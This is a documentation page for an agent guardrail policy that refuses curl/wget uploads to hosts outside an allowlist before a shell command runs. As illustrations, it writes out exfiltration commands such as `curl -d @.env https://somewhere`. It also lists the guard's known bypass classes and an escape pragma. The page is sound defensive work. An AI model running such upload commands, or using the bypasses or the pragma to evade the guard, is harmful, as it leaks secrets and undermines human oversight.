# Block Unapproved Egress

`block-unapproved-egress` · rule · enforces

<!-- generated:start — tools/gen_policy_docs.py; edit policy-prose.yaml, not this -->

| | |
| :--- | :--- |
| **Type** | `rule` (`enforcement: advise`) |
| **Mechanism** | guard script `block-unapproved-egress.sh` |
| **Reaches** | `enforced` once `chock sync` has run — the tool call is refused before it runs |
| **Compiles to** | `pre-tool-use`, `ambient-rule` |
| **Eval cases** | 18 total, 18 executable |
| **Enabled by default** | yes |

<!-- generated:end -->

## What it is about

Best-effort guard against exfiltration through the tool channel: a network command (curl/wget/Invoke-WebRequest) that UPLOADS data -- POST/PUT, --data/--form, --upload-file, --post-file -- to a host outside the egress allowlist. The allowlist defaults to package registries and code hosting and is meant to be extended with your org's own domains; a host matches by exact name or ".<entry>" suffix. Fetch-only traffic (a bare GET, `pip install`) is left alone -- the target is upload to an unapproved host, not normal dependency traffic. This is a tool-time FLOOR, not a network sandbox: it stops the obvious `curl -d @secrets https://unknown` reflex; containing a determined adversary needs real sandboxing. Known bypass classes include scheme-less URL targets (host extraction needs the http(s):// prefix), combined short flags, obfuscated payloads, non-standard clients, and egress via a language runtime. Escape: 'pragma: allowlist egress' on the line.

## What it solves

The exfiltration step that any other gate leaves untouched: once an agent can run a shell, one `curl -d @.env https://somewhere` sends your secrets out the tool channel. This blocks the obvious reflex -- a network client that uploads a body to a host you have not allowlisted -- so the easy path costs the adversary a visible allowlist edit.

## How it works

A guard script, `implementations/block-unapproved-egress.sh`, run before the agent executes a Bash command. It inspects the proposed command and exits non-zero to refuse it.

The rule text ships alongside, so an agent reading its context knows the constraint before it proposes the command rather than only after being refused:

```text
block(egress): fetch(curl|wget|iwr) + upload(-d|--data|-F|--upload-file|-X POST|PUT) to host NOT in allowlist
allow: fetch_only(GET), allowlisted_host(github|pypi|npm|...); floor_not_sandbox; escape: 'pragma: allowlist egress'
```

## Which primitive it becomes

A **PreToolUse guard**. `recompile` writes `.chock/compiled/block-unapproved-egress/pre-tool-use/pretooluse.json`, and `install-hooks` merges it into `.claude/settings.json` so the agent consults the guard script before running a Bash command. Until that install runs, the fragment is compiled and enforces nothing, and coverage says so.

## Installing it

```bash
chock add block-unapproved-egress
chock sync .
```

Or copy the folder — it does the same thing, byte for byte:

```bash
cp -r base/block-unapproved-egress  <your-repo>/.agents/policies/block-unapproved-egress
cd <your-repo> && chock sync --repo .
```

## Customising it

The allowlist IS the policy. `ALLOWED_HOSTS` ships with package registries and code hosting; add your org's own upload targets (log sinks, artifact stores, internal APIs). Be honest about the ceiling: this is a tool-time floor, not a network sandbox. Combined short flags, obfuscated payloads, non-standard clients and egress via a language runtime all remain reachable -- containing a determined adversary needs real sandboxing, and a reviewed exception rides in the diff via `pragma: allowlist egress` on the line.

Once copied, the policy is **yours**. `recompile` reads your copy as the source, so an edit reaches the compiled artifact and changes what actually happens. Nothing upstream overwrites it; re-copying from this repo is an explicit act.

After any edit:

```bash
chock sync --repo .   # rebuild the compiled artifact
chock check           # check it still conforms
chock check --only evals block-unapproved-egress
```

---

[Adoption transcript](adoption.md) — the output of installing exactly this policy into an empty repository, re-derived in CI so it cannot go stale.

Source: [`base/block-unapproved-egress/`](../../base/block-unapproved-egress/) · [all policies](../README.md)
